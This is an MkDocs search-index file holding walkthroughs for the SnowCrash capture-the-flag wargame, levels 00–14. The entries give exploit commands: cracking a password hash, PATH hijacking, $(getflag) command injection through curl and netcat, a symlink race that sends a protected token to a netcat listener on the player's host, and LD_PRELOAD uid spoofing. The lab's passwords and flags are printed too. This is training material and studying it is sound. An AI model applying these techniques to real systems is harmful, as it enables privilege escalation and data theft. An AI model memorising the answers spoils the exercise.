{"config":{"indexing":"full","lang":["en"],"min_search_length":3,"prebuild_index":false,"separator":"[\\s\\-]+"},"docs":[{"location":"index.html","text":"Welcome to MkDocs For full documentation visit mkdocs.org . Commands mkdocs new [dir-name] - Create a new project. mkdocs serve - Start the live-reloading docs server. mkdocs build - Build the documentation site. mkdocs help - Print this help message. Project layout mkdocs.yml # The configuration file. docs/ index.md # The documentation homepage. ... # Other markdown pages, images and other files.","title":"Welcome to MkDocs"},{"location":"index.html#welcome-to-mkdocs","text":"For full documentation visit mkdocs.org .","title":"Welcome to MkDocs"},{"location":"index.html#commands","text":"mkdocs new [dir-name] - Create a new project. mkdocs serve - Start the live-reloading docs server. mkdocs build - Build the documentation site. mkdocs help - Print this help message.","title":"Commands"},{"location":"index.html#project-layout","text":"mkdocs.yml # The configuration file. docs/ index.md # The documentation homepage. ... # Other markdown pages, images and other files.","title":"Project layout"},{"location":"help_level00.html","text":"You can find a file in /usr/sbin named john and owned by flag00: level00@SnowCrash:~$ find / -user flag00 2>/dev/null /usr/sbin/john /rofs/usr/sbin/john If you do cat you obtain the password encrypted with cesar code: level00@SnowCrash:~$ cat /usr/sbin/john cdiiddwpgswtgt You can use key 15 to decrypt this in the following web-page: https://www.dcode.fr/caesar-cipher","title":"Help level00"},{"location":"help_level01.html","text":"The password hashed is on /etc/passwd file level01@SnowCrash:~$ cat /etc/passwd | grep flag01 flag01:42hDRfypTqqnw:3001:3001::/home/flag/flag01:/bin/bash After, i used john the reaper for obtain the password For Ubuntu: sudo apt-get install john -y For Arch: pacman -S john Then execute: echo \"42hDRfypTqqnw\" > hash.txt; john hash.txt; john --show hash.txt; Remember to remove ?: from the output of john","title":"Help level01"},{"location":"help_level02.html","text":"There is a pcap file in your home, download the file in your computer, install tcpdump, and read it: Install tcpdump for Ubuntu (use equivalent for your operating system): sudo apt install tcpdump Download the pcap file: scp -P4242 level02@192.168.1.10:/home/user/level02/level02.pcap . And execute tcpdump: tcpdump -Xqns 0 -A -r level02.pcap There you can see that from the payload the only byte interesting to us is the one in the position 0x35 , reading this position you can find the following sequence, ( DEL means a backspace in the keyboard): \"ft_wandr\" => DEL => DEL => DEL => \"NDRel\" => DEL => \"L0L\" Resulting in the following string which indeed is the password: ft_waNDReL0L","title":"Help level02"},{"location":"help_level03.html","text":"There is a binary file named level03 in the home directory; execute the following command: objdump -s -j .rodata ./level03 From the output we can see that it calls /usr/bin/env echo Exploit me , so lets change the echo command to call getflag instead, for doing so create an file named echo that calls getflag instead: echo \"getflag\" > /tmp/echo Change permissions of the dummy echo and run the program with the PATH changed so our echo is called first than the system one: chmod 777 /tmp/echo && PATH=/tmp:$PATH ./level03","title":"Help level03"},{"location":"help_level04.html","text":"You have a perl script in your home, and you can see the address localhost:4747 inside. The script is running on background in that address. Hence analizing the script you can notice that is echoing x param, then you can curl localhost:4747?x='$(getflag)' for let the program execute getflag for you: curl localhost:4747?x='$(getflag)'","title":"Help level04"},{"location":"help_level05.html","text":"When you log in you can see that you have a mail. Go to /var/mail and there is a mail with a cronjob: cat /var/mail/level05 If you go to the path shown in the cronjob you find the script /usr/sbin/openarenaserver , let's see what's inside: cat /usr/sbin/openarenaserver This script is executing all files inside /opt/openarenaserver , then if we put a file that executes getflag and save it on another file you only need to wait for the openarenaserver to execute that file. echo \"getflag > /tmp/password\" > /opt/openarenaserver/execute.me Then you get: cat /tmp/password","title":"Help level05"},{"location":"help_level06.html","text":"We have a php file where we can see a regex expression with the flag e that allows us to execute php code: cat level06.php The program will take the content of the given file, and execute a group of regular expressions on the content of the file, so if we put [x ${getflag}] inside we will get the token: echo '[x ${`getflag`}]' > /tmp/execute.me ./level06 /tmp/execute.me","title":"Help level06"},{"location":"help_level07.html","text":"We have a binary file named level07 , using gdb and executing disassemble main command you get the following output: (gdb) disassemble main Dump of assembler code for function main: ... 0x08048576 <+98>: call 0x8048400 <getenv@plt> ... End of assembler dump. Also using objdump -s -j .rodata ./level07 we can see the read only data section: ./level07: file format elf32-i386 Contents of section .rodata: 8048678 03000000 01000200 4c4f474e 414d4500 ........LOGNAME. 8048688 2f62696e 2f656368 6f202573 2000 /bin/echo %s . So probably gets the LOGNAME environment variable with getenv and echoes it, so changing this environment variable to a subshell with the getflag command will return the token: LOGNAME=$\\(getflag\\) ./level07","title":"Help level07"},{"location":"help_level08.html","text":"We have two files: executable named level08 and a file named token which we can not read. level08 asks for a file and prints it's contents except if the file name contains the word token . A way to access a file with another name without modify it is to create a soft link: ln -s /home/user/level08/token /tmp/not_nekot && ./level08 /tmp/not_nekot","title":"Help level08"},{"location":"help_level09.html","text":"We have two files: executable named level09 and a file named token . The binary outputs the introduced string with each character incremented by it's position, the token is probably encoded with this method, so with a program ( inverse_ascii.c ) doing the inverse operation we get: scp -P 4242 ./inverse_ascii.c level09@192.168.1.10:/tmp cd /tmp && gcc -std=c99 inverse_ascii.c && ./a.out $(cat ~/token) which is the solution","title":"Help level09"},{"location":"help_level10.html","text":"We have two files: executable named level10 and a file named token which we can not read. The level10 executable sends a file to a server on port 6969, but only if the user executing it have permissions to open the file, as you can see with the output of nm command: 08048620 T _start U access@@GLIBC_2.0 0804a064 b completed.6159 It uses access system call probably to check the permisions before send it up. I you refer the access man page you can see the following warning: level Warning: Using these calls to check if a user is authorized to, for example, open a file before actually doing so using open(2) creates a security hole, because the user might exploit the short time interval between checking and opening the file to manipulate it. For this reason, the use of this system call should be avoided. (In the example just described, a safer alternative would be to temporarily switch the process's effective user ID to the real ID and then call open(2).) We can use this exploit: First: In one shell instance we can create a infinite loop that will create a file in /tmp so we have access to it, and substitute it with a symbolic link to our token file over and over again: while true; do rm -f /tmp/dummy; ln -s /home/user/level10/token /tmp/dummy; rm -f /tmp/dummy; echo \"dummy\" > /tmp/dummy; done Second: In another shell instance just create an infinite loop of the level10 executable calling this file to our host (192.168.1.18` in our case): while true; do ./level10 /tmp/dummy 192.168.1.18; done Third: Lastly in our host machine put a server listening and discard all the \"dummy\" content: nc -lk -p 6969 | grep -v 'dummy\\|.*( )*.' And here you have the token.","title":"Help level10"},{"location":"help_level11.html","text":"In the home directory you have the file level11.lua , understanding a little bit the code, we can see that its just a server which asks for a password and then checks it by processing it with sha1sum , supposing that it's running as a daemon, we can exploit the io.popen which launches a system command by calling getflag and saving it to a file: level11@SnowCrash:~$ nc localhost 5151 Password: $(getflag) > /tmp/token.txt Erf nope.. cat /tmp/token.txt","title":"Help level11"},{"location":"help_level12.html","text":"In the home directory you will find a perl script, assuming that this script is runing in the background, we will have an http server with a system call that we can exploit, the only problem is that the parameter given to this system call is previously modified, making all characters uppercase, and triming all the spaces, so one work around can be this: echo \"getflag > /tmp/flag\" > /tmp/GETFLAG; chmod +x /tmp/GETFLAG; curl http://localhost:4646/?x='$(/*/getflag)'&y=''; cat /tmp/flag;","title":"Help level12"},{"location":"help_level13.html","text":"In the home directory we have an executable file, which has the setuid bit enabled, we can know this by executing ls -la . This means that any user can execute the binary with the owners privileges. If we execute the program it says that it's expecting 4242 as uid. It gets the user id with the getuid function, which is loaded as a shared library: level13@SnowCrash:~$ nm -D ./level13 080486bc R _IO_stdin_used w __gmon_start__ U __libc_start_main U exit U getuid U printf U strdup Knowing this we can use the LD_PRELOAD exploit , an environment variable which basically will tell the binary a library that will be pre-loaded before all the standard ones, so we can create our own library with our own getuid function ( my_getuid.c ) that will return 4242. gcc -shared -fPIC /tmp/my_getuid.c -o /tmp/my_getuid.o; cp ~/level13 .; LD_PRELOAD=/tmp/my_getuid.o ./level13; Another way of solve this, is creating an user with uid=4242 and execute the binary level13 on your local machine with that user, less programatically but interesting anyway.","title":"Help level13"},{"location":"help_level14.html","text":"In this last level we have no clues to get the token, so a straight-forward solution by disassemble the getflag binary is necessary, to do so we run the binary under gdb and call the command disassemble main which will output the program in assembler. In the assembler instructions we can see 16 calls to fputs , assuming that this function will print the flags for each level alongside with some other messages, by trial and error (presumably one of the last ones fputs ) we can check those print by jumping directly to it's memory addresses in the running program. Here the section that actually contains the flag for level 14: 0x08048de3 <+1181>: jmp 0x8048e2f <main+1257> 0x08048de5 <+1183>: mov 0x804b060,%eax 0x08048dea <+1188>: mov %eax,%ebx 0x08048dec <+1190>: movl $0x8049220,(%esp) 0x08048df3 <+1197>: call 0x8048604 <ft_des> 0x08048df8 <+1202>: mov %ebx,0x4(%esp) 0x08048dfc <+1206>: mov %eax,(%esp) 0x08048dff <+1209>: call 0x8048530 <fputs@plt> so we will jump to 0x08048de5 and the program will end printing the flag for the level 14: \u279c gdb getflag (gdb) b main Breakpoint 1 at 0x804894a (gdb) run Starting program: /home/mateo/Sync/workspace/SnowCrash/level14/Resources/getflag Breakpoint 1, 0x0804894a in main () (gdb) jump *0x08048de5 Continuing at 0x8048de5. 7QiHafiNa3HVozsaXkawuYrTstxbpABHD8CPnHJ *** stack smashing detected ***: terminated Program received signal SIGABRT, Aborted. 0xf7fce569 in __kernel_vsyscall ()","title":"Help level14"}]}